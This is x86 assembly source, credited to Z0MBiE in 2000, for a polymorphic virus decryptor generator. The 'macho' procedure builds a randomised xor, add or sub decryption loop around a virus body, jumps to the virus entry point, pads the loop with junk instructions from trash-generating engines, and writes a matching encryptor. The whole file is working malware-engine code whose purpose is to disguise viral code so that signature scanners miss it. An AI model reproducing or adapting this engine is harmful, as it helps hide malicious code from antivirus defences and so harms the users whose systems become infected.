
; (x) 2000 Z0MBiE

macho                   proc    pascal

                        arg     varsize
                        arg     varstart
                        arg     virsize         ; must be DWORD-aligned!
                        arg     virentry
                        arg     viroutput
                        arg     virinput
                        arg     encryptorptr
                        arg     decryptorsizeptr
                        arg     decryptorptr
                        arg     regfree

                        local   v_index
                        local   v_jmpto
                        local   v_a
                        local   v_b
                        local   v_t
                        local   cycleoffs
                        local   encrcmd
                        local   decrcmd
                        local   xordword
                        local   disabletrash

                        pusha

                        mov     edi, decryptorptr
                        cld

                        call    prcg2

;                       mov     al, 0cch
;                       stosb

                        mov     disabletrash, 0

                        call    var_alloc
                        mov     v_index, eax

                        call    rnd2
                        jz      __a1

__a0:                   call3   cmd_v_c, c_mov, v_index, 0  ; mov index, 0
                        mov     cycleoffs, edi              ; cycle:
                        call    action                      ; [action]
                        call3   cmd_v_c, c_add, v_index, 4  ; add index, 4
                        mov     disabletrash, 1
                        call3   cmd_v_c, c_cmp, v_index, virsize ; cmp index, virsize

                        jmp     __a2

__a1:                   call3   cmd_v_c, c_mov, v_index, virsize ; mov index, virsize
                        mov     cycleoffs, edi              ; cycle:
                        call3   cmd_v_c, c_sub, v_index, 4  ; sub index, 4
                        call    action                      ; [action]
                        mov     disabletrash, 1
                        call3   cmd_v_c, c_cmp, v_index, 0  ; cmp index, 0

__a2:                   mov     ax, 850Fh       ; jnz   cycle
                        stosw
                        stosd
                        mov     eax, cycleoffs
                        sub     eax, edi
                        mov     [edi-4], eax
                        mov     disabletrash, 0
                        call    endcmd

                        call    var_alloc
                        mov     v_jmpto, eax
                        mov     eax, viroutput
                        add     eax, virentry
                        call3   cmd_v_c, c_mov, v_jmpto, eax

                        call    prcg2

                        mov     ax, 25FFh       ; jmp [v_jmpto]
                        stosw
                        mov     eax, v_jmpto
                        stosd
                        call    endcmd

                        mov     eax, decryptorsizeptr
                        or      eax, eax
                        jz      __skip1
                        sub     edi, decryptorptr
                        mov     [eax], edi
__skip1:

;[ENCRYPTOR] (esi=input, edi=output, ecx=dword-aligned-size)
;                       shr     ecx, 2
; cycle:                lodsd
;                       decrcmd eax, xordword
;                       stosd
;                       loop    cycle
;                       ret

                        mov     edi, encryptorptr
                        mov     eax, 9002E9C1h          ; shr ecx,2
                        stosd
                        mov     edx, edi                ; cycle:
                        mov     al, 0ADh                ; lodsd
                        stosb
                        mov     disabletrash, 1
                        call3   cmd_r_c, decrcmd, 0, xordword
                        mov     al, 0ABh                ; stosd
                        stosb
                        mov     al, 0E2h                ; loop
                        stosb
                        stosb
                        sub     edx, edi
                        mov     [edi-1], dl
                        mov     al, 0C3h                ; retn
                        stosb

                        popa
                        ret

prcg2:                  call    rnd2
                        jz      __skip_prcg
                        call    prcg_engine
                        add     edi, eax
__skip_prcg:            retn

var_alloc:           ;  mov     eax, varsize
                     ;  sub     eax, 4
                     ;  call    my_random
                     ;  pop     ecx
                     ;  add     eax, varstart
                        mov     eax, varstart
                        add     varstart, 4
                        retn

action:                 call    var_alloc
                        mov     v_a, eax
                        call3   cmd_v_v, c_mov, v_a, v_index ; mov a, index
                        call3   cmd_v_c, c_add, v_a, virinput; add a, virinput
                        call    var_alloc
                        mov     v_t, eax
                        call3   cmd_v_memv, c_mov, v_t, v_a  ; mov t, [a]
                        ;;
                        call    rndcmd
                        mov     eax, randseed
                        mov     xordword, eax
                        ;;
                        call3   cmd_v_c, encrcmd, v_t, xordword
                        call    var_alloc
                        mov     v_b, eax
                        call3   cmd_v_v, c_mov, v_b, v_index ; mov b, index
                        call3   cmd_v_c, c_add, v_b, viroutput; add b, viroutput
                        call3   cmd_memv_v, c_mov, v_b, v_t  ; mov [b], t
                        retn

rndcmd:                 call    rnd3
                        jz      __x2
                        dec     eax
                        jz      __x1
__x0:                   push    c_xor
                        push    c_xor
                        jmp     __x
__x1:                   push    c_add
                        push    c_sub
                        jmp     __x
__x2:                   push    c_sub
                        push    c_add
__x:                    pop     encrcmd
                        pop     decrcmd
                        retn

endcmd:                 cmp     disabletrash, 1
                        je      __rt
                        pusha
                        call    rnd2    ; # of cmds
                        lea     ecx, [eax+1]  ; ecx=1/2
                        push    eax
                        mov     eax, esp
                        pusho   my_rnd
                        push    edi
                        push    1024
                        push    ecx
                        push    eax
                        push    regfree
                        push    REG_ALL
                        push    ETG_ALL-ETG_JMPS-ETG_SEG
                        call    etg_engine
                        pop     eax
                        add     [esp], eax
                        popa
__rt:                   retn

macho                   endp
